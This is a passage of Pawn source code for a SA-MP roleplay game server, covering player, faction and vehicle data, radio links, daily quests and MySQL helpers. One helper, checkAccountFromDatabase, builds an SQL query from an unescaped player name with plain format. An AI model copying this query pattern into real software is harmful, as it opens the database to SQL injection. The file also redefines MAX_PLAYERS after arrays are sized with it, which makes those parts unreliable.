#include <a_samp>
#include <a_mysql>
#include <a_zones>

#include <fly>
#include <core>
#include <float>
#include <colors>

#include <sscanf2>
#include <streamer>
#include <rotations>
#include <progress2>
#include <easyDialog>
#include <mSelection>
#include <crashdetect>
#include <timestamptodate>
#include <gmenu>
#define YSI_NO_MODE_CACHE
#define YSI_YES_HEAP_MALLOC
#define DYNAMIC_MEMORY (65536)

#define YSI_NO_OPTIMISATION_MESSAGE


#include <YSI_Data\y_iterate>
#include <YSI_Coding\y_hooks>
#include <YSI_Coding\y_timers>
#include <YSI_Coding\y_inline>
#include <YSI_Visual\y_commands>

#define MAX_PERSONAL_CARS (105)
#define SV_TESTE


// pt afk
// new Float:PlayerPosii[MAX_PLAYERS][6];
// 
new BuyCar[MAX_PLAYERS];
new TogPremium[MAX_PLAYERS];
new TogVIP[MAX_PLAYERS];
enum vInfo {
    vID,vStock,vPrice,vSpeed, vModel, vName[255]
};
new Stock[120][vInfo];
#undef MAX_PLAYERS
#define MAX_PLAYERS (5)
#define COMMUNITY_YEARS 0

// == SV VEHICLES ==
#define VEH_TYPE_NONE (1)
#define VEH_TYPE_GROUP (2)
#define VEH_TYPE_CLAN (3)
#define VEH_TYPE_ADMIN (4)
#define VEH_TYPE_JOB (5)
#define VEH_TYPE_PERSONAL (6)

#define MAX_VEH_TYPE (7)

#define GetVehicleName(%0) aVehicleNames[GetVehicleModel(%0) - 400]
#define                 hidePlayerDialog(%0)                    Dialog_Show(%0, -1, 0, " ", " ", "", "")
// ==

// ==
#define EX_SPLITLENGTH 120
#define EX_SPLITLENGTHH 128
#define MAX_CHARS_PER_LINE 116
#define FINAL_DOTS
// ==

// == REPORTS ==
#define REPORT_TYPE_DM (1)
#define REPORT_TYPE_STUCK (2)
#define REPORT_TYPE_OTHER (3)
// ==

// == FACTIONS ==
#define MAX_FACTIONS (15)

#define FACTION_TYPE_OTHER (0)
#define FACTION_TYPE_POLICE (1)
#define FACTION_TYPE_GANG (2)

#define MAX_FACTION_VEHICLES (50 * MAX_FACTIONS)
#define STREAMER_BEGIN_FACTIONS (STREAMER_BEGIN_BUSINESS_SPHERE + 100)
//

#define SCM SendClientMessage
#define SCMF va_SendClientMessage
#pragma unused DONT_USE_SCM

#define function%0(%1) forward%0(%1); public%0(%1)
#define check_admin if(PlayerInfo[playerid][pAdmin] < 1) return sendAcces(playerid);
#define check_owner if(PlayerInfo[playerid][pAdmin] < 7) return sendAcces(playerid);
#define check_helper if(PlayerInfo[playerid][pHelper] < 1) return sendAcces(playerid);

#define check_queries if(mysql_unprocessed_queries() > 10) return SCM(playerid, COLOR_GREY, "Nu poti folosi aceasta optiune in acest moment deoarece baza de date a serverului este incarcata! Reincearca in cateva momente!");

#define AdminOnly "Nu aveti gradul administrativ necesar."
#define MAX_PLAYERS_ON_LOGIN (1)

#define COLOR_SERVER 0x909CE7FF
enum sel
{
    snume[32],
    sid,
    srank,
    swarn,
    Numele[ MAX_PLAYER_NAME ],
};
new rankidsel [ MAX_PLAYERS ];
new Selected[101][sel];
new
	SQL = -1, SQL_CONNECTION_TYPE = 2, SERVER_FACTIONS = 0, SERVER_AMOTD[128], gString[1024], gQuery[512],

	dSelected[MAX_PLAYERS][101], MemberSelect[MAX_PLAYERS], WantName[MAX_PLAYERS][MAX_PLAYER_NAME],

    Text3D:playerPet[MAX_PLAYERS], Factiune[MAX_PLAYERS], FactiunePlayer[MAX_PLAYERS],

	Iterator: Admins<MAX_PLAYERS>, Iterator: Helpers<MAX_PLAYERS>, Iterator: Spectators<MAX_PLAYERS>,
	Iterator: Leaders<MAX_PLAYERS>, Iterator: PlayersInVehicle<MAX_PLAYERS>, Iterator: streamedPlayers[MAX_PLAYERS]<MAX_PLAYERS>,
	Iterator: sendReport<MAX_PLAYERS>, Iterator:Cheaters<MAX_PLAYERS>, Iterator: streamedVehicles[MAX_PLAYERS]<MAX_VEHICLES>,
	Iterator: VehicleType<MAX_VEH_TYPE, MAX_VEHICLES>, Iterator: WantedPlayers<MAX_PLAYERS>, Iterator: Cops<MAX_PLAYERS>,
    Iterator:playersInLogin<MAX_PLAYERS>, Iterator:playersInQueue<MAX_PLAYERS>, Iterator:Gangsters<MAX_PLAYERS>, Iterator: Premiums<MAX_PLAYERS>,
    Iterator: Vips<MAX_PLAYERS>,

    Timer:timerLoginQueue,

    Text: Time,
    Text: Date,
	PlayerText: FPSHud[MAX_PLAYERS], PlayerText: HudTD[MAX_PLAYERS], PlayerText:veh_speedo[MAX_PLAYERS],
	PlayerText: Speedo[MAX_PLAYERS][3], PlayerText: WantedTD[MAX_PLAYERS], PlayerText: LogoPTD[MAX_PLAYERS],
    PlayerText: PayDayTD[MAX_PLAYERS][4],


	PlayerBar: HUDProgress[MAX_PLAYERS];

enum pInfo
{
	pSQLID, pNormalName, pKey[32+1], pEmail[32], pAdmin, pHelper, pMember, pLanguage, pSex, pModel, pAge, pLevel, pTut,
	pHouse, pBusiness, pSpawnChange, pColor, pNeons[6], Float: pConnectTime, pWantedLevel, pRank, pHUD[12], pExp, pMats,
	pDrugs, pCarLic, pCarLicSuspend, pGunLic, pGunLicSuspend, pBoatLic, pFlyLic, pJailed, pQuest[3], pQuestProgress[3],
    pQuestNeed[3], pJailTime, pArrested, pPaydayTime, pPayDay, pFACWarns, pFactionTime, pFactionJoin, pFpunish, pCrimes,
    pMuted, pMuteTime, pReportMuted, pCrime1[64], pCrime2[64], pCrime3[64], pVictim[32], pAccused[32], pPet, pPetStatus,
    pPetSkin, pPetPoints, pPetLevel, pPetName[30], pCash, pAccount, pAccountLY, pPremiumAccount, pPremiumAccountDays, pVIPAccount, pVIPAccountDays, pPremiumPoints, pPnumber, pWarns, pCarSlots,
    pAccType, pGiftPoints, pRob, pCrates[4], pCrateTime, pLeader, pColors,  pClan,
    pClanRank
};
new PlayerInfo[MAX_PLAYERS][pInfo];

enum pSInfo
{
	pSLoggedIn, pSRegistrationStep, pSAccountExist, pSFlyMode, pSVehEnterTime, pSDrunkLevelLast, pSFPS, pSRefuelling, pSInHQ,
	pSUndercover, pSInHouse, pSInBusiness, pSCP, pSLastVehicle, pSAFK, pSPlayerSpec, pSNewbieEnabled, bool: pSWeaponData[13],
	pSOnDuty, Float: pSPos[6], Float: pSHealth, Float: pSArmour, pSFactionSpec, pSTogFaction, pSCased, pSDialogItems[101],
    pSFactionOffer, pSDialogSelected, pSTogFind, pSCanSpec, pSSleeping, pSHandsUp, pSHireCar, pSChased, pSTypeName, pSNextNotify
};

new s_PlayerInfo[MAX_PLAYERS][pSInfo], resetStaticEnum[pSInfo];

enum beforeSpectateInfo {
    Float: pOldPos[3], pWorld, pInt, pState, pInVehicle, bool:pSpectating
};
new BeforeSpectate[MAX_PLAYERS][beforeSpectateInfo];

enum vehInfo
{
	vehType, vehFuel, vehEngine, vehLocked, vehLights
};
new VehicleInfo[MAX_VEHICLES][vehInfo];
static stock returnVehicle;

enum fvehInfo
{
	vehModel, vehGroup, vehRank, vehObjID
};
new f_VehicleInfo[MAX_FACTION_VEHICLES][fvehInfo], vehicleGroupId[MAX_VEHICLES];

enum fInfo
{
	fID,fName[128],Float:fcX,Float:fcY,Float:fcZ,Float:fceX,Float:fceY,Float:fceZ,Float:fSafePos[3],fSafePickupID,
	Text3D:fSafeLabelID,fMats,fDrugs,fBank,fAnn[128],fWin,fLost,fMembers,fMaxMembers,fMinLevel,fApplication,
	fInterior,fVirtual,fMapIcon,fLocked,fPickupID,fPickupIDD,Text3D:fLabelID, fRankName1[64], fRankName2[64],
	fRankName3[64], fRankName4[64], fRankName5[64], fRankName6[64],fRankName7[64], fWarTurf, fSphere
};
new DynamicFactions[MAX_FACTIONS][fInfo], Iterator: FactionMembers<MAX_FACTIONS, MAX_PLAYERS>, factionType[MAX_FACTIONS];

new FactionSkin[][] =
{
	{},
	{71, 284, 281, 266, 283, 267, 267, 306},
	{163, 164, 166, 166, 286, 295, 295, 307},
	{287, 287, 287, 285, 288, 273, 273, 76},
	{206, 127, 124, 125, 125, 120, 126, 191},
	{181, 121, 123, 123, 122, 242, 242, 224},
	{112, 179, 179, 114, 184, 46, 46, 192},
	{253, 155, 61, 61, 227, 228, 228, 141},
	{71, 284, 281, 266, 283, 267, 267, 309},
	{188, 188, 17, 187, 187, 147, 147, 141},
	{111, 112, 118, 118, 59, 272, 272, 169},
	{208, 117, 117, 120, 186, 294, 294, 225},
	{153, 171, 171, 240, 240, 189, 189, 194},
	{253, 155, 61, 61, 227, 228, 228, 141},
	{276, 275, 274, 277, 279, 228, 228, 308}
};

new Float: gateLocationsClosed[][] = 
{
    {1592.65674, -1638.05286, 9.89110, 2.0, -1000.0, -1000.0, -1000.0}, // gate lspd
    {-1631.81848, 688.23511, 8.70330, 2.0, -1000.0, -1000.0, -1000.0}, // gate sfpd
    {135.2833, 1941.3331, 21.6932, 1.5, -1000.0, -1000.0, -1000.0}, // gate ng
    {1544.7007, -1630.7527, 13.2983, 1.5, 0.0000, 90.0200, 90.0000}, // lspd bar
    {-1572.216186, 658.646850, 7.224934, 1.5, 0.00000, 90.00000, 90.00000}, // sfpd bar
    {-1701.435302, 687.763061, 25.000843, 1.5, 0.0000, 90.0000, -90.0000} // sfpd bar 2
};

new Float: gateLocationsMoved[][] = 
{
    {1592.65674, -1638.05286, 9.89110, 2.0, -1000.0, -1000.0, -1000.0}, // gate lspd
    {-1631.81848, 688.23511, 3.65426, 2.0, 0.00000, 0.00000, 90.00000}, // gate sfpd
    {122.0023, 1941.4100, 21.6932, 2.0, -1000.0, -1000.0, -1000.0}, // gate ng
    {1544.7007, -1630.7527, 13.2983, 1.0, 0.0000, 0.0000, 90.0000}, // lspd bar
    {-1572.216186, 658.646850, 7.224934, 1.0, 0.00000, 0.00000, 90.00000}, // sfpd bar
    {-1701.435302, 687.763061, 25.000843, 1.0, 0.00000, 0.00000, 90.00000} // sfpd bar 2
};

new Float: gateLocations[][] = 
{
    {1588.6552, -1637.9025, 15.0358}, // gate lspd
    {-1627.7673, 693.9869, 6.9366}, // gate sfpd
    {135.2833, 1941.3331, 21.6932}, // gate ng
    {1544.7007, -1630.7527, 13.2983}, // lspd bar
    {-1572.5844, 661.8561, 7.1875}, // sfpd bar
    {-1701.0692, 684.4746, 24.8007} // sfpd bar 2
};

new gateObject[sizeof gateLocations];

enum
{
    QUEST_TYPE_NONE, QUEST_TYPE_BASEBALL, QUEST_TYPE_CHILLIAD, QUEST_TYPE_VEHKM, QUEST_TYPE_ROB, QUEST_TYPE_ATMROB, QUEST_TYPE_MATS,
    QUEST_TYPE_FISH, QUEST_TYPE_PIZZA, QUEST_TYPE_WANTED, QUEST_TYPE_COPS, QUEST_TYPE_PAINT, QUEST_TYPE_GARBAGE, QUEST_TYPE_FARM,
    QUEST_TYPE_DRUGS, QUEST_TYPE_BAR, QUEST_TYPE_CLOTHES, QUEST_TYPE_DICE
}

enum attached_object_data
{
    ao_model, ao_bone, Float:ao_x, Float:ao_y, Float:ao_z, Float:ao_rx, Float:ao_ry, Float:ao_rz, Float:ao_sx, Float:ao_sy, Float:ao_sz
}
new ao[MAX_PLAYERS][MAX_PLAYER_ATTACHED_OBJECTS][attached_object_data];

native IsValidVehicle(vehicleid);

new GunNames[][] =
{
    "Nothing", "Brass Knuckles", "Golf Club", "Nitestick", "Knife", "Baseball Bat", "Showel", "Pool Cue",
    "Katana", "Chainsaw", "Purple Dildo", "Small White Dildo", "Long White Dildo", "Vibrator", "Flowers",
    "Cane", "Grenade", "Tear Gas", "Molotov", "Vehicle Missile", "Hydra Flare", "Jetpack", "Glock",
    "Silenced Colt", "Desert Eagle", "Shotgun", "Sawn Off", "Combat Shotgun", "Micro UZI", "MP5", "AK47",
    "M4", "Tec9", "Rifle", "Sniper Rifle", "Rocket Launcher", "HS Rocket Launcher", "Flamethrower",
    "Minigun", "Satchel Charge", "Detonator", "Spraycan", "Fire Extinguisher", "Camera", "Nightvision",
    "Infrared Vision", "Parachute", "Fake Pistol"
};

new aVehicleNames[][] =
{
    "Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial", "Sentinel",
	"Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana", "Infernus",
	"Voodoo", "Pony", "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam",
    "Esperanto", "Taxi", "Washington", "Bobcat", "Whoopee", "BF Injection",
	"Hunter", "Premier", "Enforcer", "Securicar", "Banshee", "Predator", "Bus",
	"Rhino", "Barracks", "Hotknife", "Trailer", "Previon", "Coach", "Cabbie",
	"Stallion", "Rumpo", "RC Bandit", "Romero", "Packer", "Monster", "Admiral",
	"Squalo", "Seasparrow", "Pizzaboy", "Tram", "Trailer", "Turismo", "Speeder",
	"Reefer", "Tropic", "Flatbed", "Yankee", "Caddy", "Solair", "Berkley's RC Van",
	"Skimmer", "PCJ-600", "Faggio", "Freeway", "RC Baron", "RC Raider", "Glendale",
	"Oceanic","Sanchez", "Sparrow", "Patriot", "Quad", "Coastguard", "Dinghy",
	"Hermes", "Sabre", "Rustler", "ZR-350", "Walton", "Regina", "Comet", "BMX",
	"Burrito", "Camper", "Marquis", "Baggage", "Dozer", "Maverick", "News Chopper",
	"Rancher", "FBI Rancher", "Virgo", "Greenwood", "Jetmax", "Hotring Racer C", "Sandking",
	"Blista Compact", "Police Maverick", "Boxville", "Benson", "Mesa", "RC Goblin",
	"Hotring Racer A", "Hotring Racer B", "Bloodring Banger", "Rancher", "Super GT",
	"Elegant", "Journey", "Bike", "Mountain Bike", "Beagle", "Cropduster", "Stunt",
 	"Tanker", "Roadtrain", "Nebula", "Majestic", "Buccaneer", "Shamal", "Hydra",
 	"FCR-900", "NRG-500", "HPV1000", "Cement Truck", "Tow Truck", "Fortune",
 	"Cadrona", "FBI Truck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer",
 	"Remington", "Slamvan", "Blade", "Freight", "Streak", "Vortex", "Vincent",
    "Bullet", "Clover", "Sadler", "Firetruck", "Hustler", "Intruder", "Primo",
	"Cargobob", "Tampa", "Sunrise", "Merit", "Utility", "Nevada", "Yosemite",
	"Windsor", "Monster", "Monster", "Uranus", "Jester", "Sultan", "Stratum",
	"Elegy", "Raindance", "RC Tiger", "Flash", "Tahoma", "Savanna", "Bandito",
    "Freight Flat", "Streak Carriage", "Kart", "Mower", "Dune", "Sweeper",
	"Broadway", "Tornado", "AT-400", "DFT-30", "Huntley", "Stafford", "BF-400",
	"News Van", "Tug", "Trailer", "Emperor", "Wayfarer", "Euros", "Hotdog", "Club",
	"Freight Box", "Trailer", "Andromada", "Dodo", "RC Cam", "Launch", "Police Car",
 	"Police Car", "Police Car", "Police Ranger", "Picador", "S.W.A.T", "Alpha",
 	"Phoenix", "Glendale", "Sadler", "Luggage", "Luggage", "Stairs", "Boxville",
 	"Tiller", "Utility Trailer"
};

new RadioNames[][] = {
    {"{FF0000}Turn Off Radio"},
    {"Pro FM Romania"},
    {"Radio Bandit Romania"},
    {"Radio Taraf Romania"},
    {"Radio Hot Romania"},
    {"Radio Gangsta Dance"},
    {"Radio Gangsta Manele"},
    {".977 Hitz"},
    {".977 Mix"},
    {".977 Alternative"},
    {"Radio BBC One UK"},
    {"Dubstep.fm"},
    {"Radio Hit Romania"},
    {"Radio ClubMix Romania"},
    {"Kiss FM Romania [Audio Plugin]"},
    {"Radio Zu Romania [Audio Plugin]"},
    {"Radio Popular"},
    {"Trap.FM"},
    {"Radio Tequila Hip Hop"}
};

new RadioLinks[][] = {
    {""},
    {"http://stream.profm.ro:8012/profm.mp3"},
    {"http://live.radiobandit.ro:8000"},
    {"http://radiotaraf.com/live.m3u"},
    {"http://live.radiohot.ro:8000/"},
    {"http://dance.radiogangsta.ro:8800"},
    {"http://live.radiogangsta.ro:8800"},
    {"http://7619.live.streamtheworld.com:80/977_HITS_SC"},
    {"http://7639.live.streamtheworld.com:80/977_MIX_SC"},
    {"http://7579.live.streamtheworld.com:80/977_ALTERN_SC"},
    {"http://www.listenlive.eu/bbcradio1.m3u"},
    {"http://dubstep.fm/128.pls"},
    {"http://www.radio-hit.ro/asculta.m3u"},
    {"http://live.radioclubmix.ro:9999"},
    {"http://80.86.106.136/listen.pls"},
    {"http://www.radiozu.ro/live.m3u"},
    {"http://livemp3.radiopopular.ro:7777"},
    {"http://radio.trap.fm/listen128.pls"},
    {"http://radiotequila.ro/hiphop.m3u"}
};

new HudColors[][] =
{   
    {"{FFFFFF}Disable"},
    {"{C0C0C0}Grey"},
    {"{990000}Red"},
    {"{00ff00}Green"},
    {"{0000ff}Blue"},
    {"{ffff00}Yellow"}
};

main()
{
	print("\n----------------------------------");
	print("T4P Script - ionchyAdv in colaborare cu Drimi si la sfarsit si timpitu de ionutadv\n");
	print("----------------------------------\n");
}

#include </systems/money_data.inc>

#include </systems/atms.inc>
#include </systems/helpers.inc>
#include </systems/houses.inc>
#include </systems/businesses.inc>
#include </systems/auctions.inc>
#include </systems/gmenu.inc>
#include </systems/gamble.inc>

// ======== STOCKS ========


stock GetIDClan( const nume[ ] )
{
    foreach(new i : Player)
    {
        if(strcmp( nume, PlayerInfo[i][pNormalName],true) == 0) return i;
    }
    return INVALID_PLAYER_ID;
}

stock ClanBroadCast(clan, color, const string[])
{
    foreach(new i : Player)
    {
        if(IsPlayerConnected(i))
        {
            if(PlayerInfo[i][pClan] == clan)
            {
                SendClientMessage(i, color, string);
            }
        }
    }
}


stock getChatColors(playerid)
{
    new 
        returnString[32];

    switch(PlayerInfo[playerid][pColors])
    {
        case 0: returnString = "{CECECE}";
        case 1: returnString = "{0087FE}";
        case 2: returnString = "{4700C2}";
        case 3: returnString = "{EBFF00}";
        case 4: returnString = "{EF00FF}";
        case 5: returnString = "{40FF00}";
        case 6: returnString = "{9CFF29}";
        case 7: returnString = "{0E7F03}";
        case 8: returnString = "{FF9A00}";
        case 9: returnString = "{222222}";
        case 10: returnString = "{FF4C9D}";
        case 11: returnString = "{990000}";
        case 12: returnString = "{ff3333}";
        case 13: returnString = "{e60000}";
    }
    return returnString;
}
stock round_float(Float:value)
{
    if (value >= 0.0)
    {
        return value + 0.5;
    }
    else
    {
        return value - 0.5;
    }
}

stock calculatePercentResult(amount_to_multiply, percent_amount)
{
    return amount_to_multiply * percent_amount / 100;
}

stock calculatePercentResultAsString(amount_to_multiply, percent_amount)
{
    new result_str[32]; // Alocăm un șir pentru a stoca rezultatul
    format(result_str, sizeof(result_str), "%d", (amount_to_multiply * percent_amount / 100));

    return result_str;
}

stock Text3D:CreateStreamed3DTextLabel(const string[], color, Float:posx, Float:posy, Float:posz, Float:draw_distance, virtualworld, testlos = 0)
{
    return CreateDynamic3DTextLabel(string, color, posx, posy, posz, draw_distance, INVALID_PLAYER_ID, INVALID_PLAYER_ID, testlos, virtualworld, -1, -1, 100.0);
}

stock returnLevelReq(level, type)
{
    if(type == 1)
    {
        switch(level)
        {
            case 1..4: return level * 2;
            default: return level * 3;
        }
    }
    else if(type == 2)
    {
        switch(level)
        {
            case 1..4: return level * 40000;
            default: return level * 280000;
        }
    }
    return -1;
}

stock GetFactionMembers(fid)
{
    new nr = 0;
    gQuery[0] = EOS;
    format(gQuery, sizeof(gQuery), "SELECT * FROM `users` WHERE `Member` = %d ORDER BY `id`", fid);
    new Cache: stringresult2 = mysql_query(SQL, gQuery);
    if(cache_get_row_count() > 0)
        for(new i, j = cache_get_row_count (); i != j; ++i)
            nr++;
    cache_delete(stringresult2);
    return nr;
}


stock SetPlayerAttachedObjectEx(playerid, index, modelid, bone, Float:fOffsetX = 0.0, Float:fOffsetY = 0.0, Float:fOffsetZ = 0.0, Float:fRotX = 0.0, Float:fRotY = 0.0, Float:fRotZ = 0.0, Float:fScaleX = 1.0, Float:fScaleY = 1.0, Float:fScaleZ = 1.0, materialcolor1 = 0, materialcolor2 = 0) {
    ao[playerid][index][ao_x] = fOffsetX; ao[playerid][index][ao_y] = fOffsetY;  ao[playerid][index][ao_z] = fOffsetZ; ao[playerid][index][ao_rx] = fRotX;
    ao[playerid][index][ao_ry] = fRotY; ao[playerid][index][ao_rz] = fRotZ; ao[playerid][index][ao_sx] = fScaleX; ao[playerid][index][ao_sy] = fScaleY; ao[playerid][index][ao_sz] = fScaleZ;
    SetPlayerAttachedObject(playerid, index, modelid, bone, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ, fScaleX, fScaleY, fScaleZ, materialcolor1, materialcolor2);
    return 1;
}

stock sendError(playerid, const string[], va_args<>) {
    new
        stringMessage[128];
    va_format(stringMessage, sizeof stringMessage, string, va_start<2>);
    SCMF(playerid, COLOR_GREY, "Error: {FFFFFF}%s", stringMessage);
    return 1;
}

stock checkAccountFromDatabase(playername[]) 
{
    gQuery[0] = (EOS);
    format(gQuery, sizeof(gQuery), "SELECT `id` FROM users WHERE `name` = '%s'", playername);
    new Cache: ab = mysql_query(SQL, gQuery);

    if(cache_get_row_count() == 0)
    {
        cache_delete(ab);
        return 0;
    }
    else
    {
        new intid;
        intid = cache_get_field_content_int(0, "id");
        cache_delete(ab);
        return intid;
    }
}
stock IsAMember(playerid) {
    if(IsPlayerConnected(playerid)) {
        new leader = PlayerInfo[playerid][pLeader], member = PlayerInfo[playerid][pMember];
        if(member == 4 || member == 5 || member == 6 || member == 10) { return 1; }
        if(leader == 4 || leader == 5 || leader == 6 || leader == 10) { return 1; }
    }
    return 0;
}
stock IsACopCar(vehicleid)
{
    new
        vehicleFactionId = vehicleGroupId[vehicleid];

    switch(f_VehicleInfo[vehicleFactionId][vehGroup])
    {
        case 1, 2, 3, 8: return 1;
    }
    return 0;
}

stock proceed_connect_camera(playerid)
{
    SetPlayerVirtualWorld(playerid, playerid + 1);
    SetPlayerPosEx(playerid, 950.1689, -1189.1039, 63.5191);
    SetPlayerFacingAngle(playerid, 1.1746);
    InterpolateCameraPos(playerid, 950.1689, -1189.1039, 63.5191 + 10.0, 1328.4565, -886.2022, 78.5393, 20000);
    InterpolateCameraLookAt(playerid, 1328.4565, -886.2022, 78.5393 - 10, 950.1689, -1189.1039, 63.5191 + 10.0, 20000);
}

stock PreloadAnimLib(playerid, const animlib[])
{
    ApplyAnimation(playerid, animlib, "null", 0.0, 0, 0, 0, 0, 0);
}

stock SetInvalidCheckpoint(playerid)
{
    DisablePlayerCheckpoint(playerid);
    DisablePlayerRaceCheckpoint(playerid);
	return s_PlayerInfo[playerid][pSCP] = 0;
}

stock IsPlayerNearVehicle(playerid, vehicleid, Float: range)
{
    new
        Float: veh_pos[3];

    GetVehiclePos(vehicleid, veh_pos[0], veh_pos[1], veh_pos[2]);
    return (IsPlayerInRangeOfPoint(playerid, range, veh_pos[0], veh_pos[1], veh_pos[2])) ? (1) : (0);
}

stock OnePlayAnim(playerid, const animlib[], const animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
	ApplyAnimation(playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
}

stock SetQuestNeedPoints(questId)
{
    switch(questId)
    {
        case QUEST_TYPE_BASEBALL: return 1;
        case QUEST_TYPE_CHILLIAD: return 1;
        case QUEST_TYPE_VEHKM: return RandomEx(10, 25);
        case QUEST_TYPE_ROB: return 1;
        case QUEST_TYPE_ATMROB: return RandomEx(5, 10);
        case QUEST_TYPE_MATS: return RandomEx(3000, 10000);
        case QUEST_TYPE_FISH: return RandomEx(5, 15);
        case QUEST_TYPE_PIZZA: return RandomEx(5, 15);
        case QUEST_TYPE_WANTED: return 1;
        case QUEST_TYPE_COPS: return RandomEx(2, 5);
        case QUEST_TYPE_PAINT: return RandomEx(5, 20);
        case QUEST_TYPE_GARBAGE: return RandomEx(60, 120);
        case QUEST_TYPE_FARM: return RandomEx(25, 50);
        case QUEST_TYPE_DRUGS: return 1;
        case QUEST_TYPE_BAR: return 1;
        case QUEST_TYPE_CLOTHES: return 1;
        case QUEST_TYPE_DICE: return RandomEx(2, 10);
    }
    return 1;
}

stock GetQuestName(playerid, questId)
{
    new
        questName[144];
    
    switch(questId)
    {
        case QUEST_TYPE_BASEBALL:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Go to the baseball stadium located in Las Venturas";
            else
                questName = "Mergi pe stadionul de baseball din Las Venturas";
        }
        case QUEST_TYPE_CHILLIAD:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Climb mount Chiliad";
            else
                questName = "Urca pe muntele Chiliad";
        }
        case QUEST_TYPE_VEHKM:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Travel %d KM with a personal vehicle";
            else
                questName = "Parcurge distanta de %d KM cu un vehicul personal";
        }
        case QUEST_TYPE_ROB:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Rob a business";
            else
                questName = "Jefuieste o afacere";
        }
        case QUEST_TYPE_ATMROB:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Rob %d ATMs";
            else
                questName = "Jefuieste %d ATM-uri";
        }
        case QUEST_TYPE_MATS:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Collect %d materials";
            else
                questName = "Colecteaza %d materiale";
        }
        case QUEST_TYPE_FISH:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Catch and sell %d fish";
            else
                questName = "Vinde %d pesti";
        }
        case QUEST_TYPE_PIZZA:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Deliver %d pizza";
            else
                questName = "Livreaza %d pizza";
        }
        case QUEST_TYPE_WANTED:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Get wanted and lose the wanted level without be caught by cops";
            else
                questName = "Primeste wanted si scapa de acesta fara a fi capturat";
        }
        case QUEST_TYPE_COPS:
        {
            if(IsACop(playerid))
            {
                if(PlayerInfo[playerid][pLanguage] == 1)
                    questName = "Arrest %d suspects";
                else
                    questName = "Aresteaza %d suspecti";
            }
            else
            {
                if(PlayerInfo[playerid][pLanguage] == 1)
                    questName = "Kill %d cops";
                else
                    questName = "Omoara %d politisti";
            }
        }
        case QUEST_TYPE_PAINT:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Kill %d players at paintball";
            else
                questName = "Omoara %d playeri la Paintball";
        }
        case QUEST_TYPE_GARBAGE:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Collect and unload %d KG of garbage";
            else
                questName = "Colecteaza si descarca %d KG de gunoi";
        }
        case QUEST_TYPE_FARM:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Sell %d KG of flour";
            else
                questName = "Vinde %d KG de faina";
        }
        case QUEST_TYPE_DRUGS:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Buy drugs and use them";
            else
                questName = "Cumpara droguri si foloseste-le";
        }
        case QUEST_TYPE_BAR:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Go in a bar and get drunk";
            else
                questName = "Du-te intr-un bar si imbata-te";
        }
        case QUEST_TYPE_CLOTHES:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Buy some new clothes";
            else
                questName = "Schimba-ti skinul la un clothing store";
        }
        case QUEST_TYPE_DICE:
        {
            if(PlayerInfo[playerid][pLanguage] == 1)
                questName = "Win %d times at dice";
            else
                questName = "Castiga %d maini la barbut";
        }
    }

    return questName;
}

stock GivePlayerQuests(playerid)
{
    PlayerInfo[playerid][pQuest][0] = RandomEx(1, 6);
    PlayerInfo[playerid][pQuest][1] = RandomEx(7, 12);
    PlayerInfo[playerid][pQuest][2] = RandomEx(13, 17);

    if(IsACop(playerid))
    {
        if(PlayerInfo[playerid][pQuest][0] == QUEST_TYPE_ROB || PlayerInfo[playerid][pQuest][0] == QUEST_TYPE_ATMROB || PlayerInfo[playerid][pQuest][0] == QUEST_TYPE_WANTED)
            PlayerInfo[playerid][pQuest][0] = RandomEx(1, 2);
    }

    PlayerInfo[playerid][pQuestProgress][0] = 0;
    PlayerInfo[playerid][pQuestProgress][1] = 0;
    PlayerInfo[playerid][pQuestProgress][2] = 0;

    PlayerInfo[playerid][pQuestNeed][0] = SetQuestNeedPoints(PlayerInfo[playerid][pQuest][0]);
    PlayerInfo[playerid][pQuestNeed][1] = SetQuestNeedPoints(PlayerInfo[playerid][pQuest][1]);
    PlayerInfo[playerid][pQuestNeed][2] = SetQuestNeedPoints(PlayerInfo[playerid][pQuest][2]);

    mysql_format(SQL, gString, sizeof gString, "update `users` set `Quest` = '%d %d %d', `QuestNeed` = '%d %d %d' where `id` = '%d';", PlayerInfo[playerid][pQuest][0], PlayerInfo[playerid][pQuest][1], PlayerInfo[playerid][pQuest][2], PlayerInfo[playerid][pQuestNeed][0], PlayerInfo[playerid][pQuestNeed][1], PlayerInfo[playerid][pQuestNeed][2], PlayerInfo[playerid][pSQLID]);
    mysql_tquery(SQL, gString, "", "");

    return 1;
}

stock DailyQuestCheck(playerid, questid, progress)
{
    new
        quest_slot = PlayerInfo[playerid][pQuest][0] == questid ? (0) : PlayerInfo[playerid][pQuest][1] == questid ? (1) : PlayerInfo[playerid][pQuest][2] == questid ? (2) : (-1);

    if(quest_slot == -1 || PlayerInfo[playerid][pQuestProgress][quest_slot] >= PlayerInfo[playerid][pQuestNeed][quest_slot])
        return 1;

    if(progress + PlayerInfo[playerid][pQuestProgress][quest_slot] > PlayerInfo[playerid][pQuestNeed][quest_slot])
        PlayerInfo[playerid][pQuestProgress][quest_slot] = PlayerInfo[playerid][pQuestNeed][quest_slot];
    else
        PlayerInfo[playerid][pQuestProgress][quest_slot] += progress;

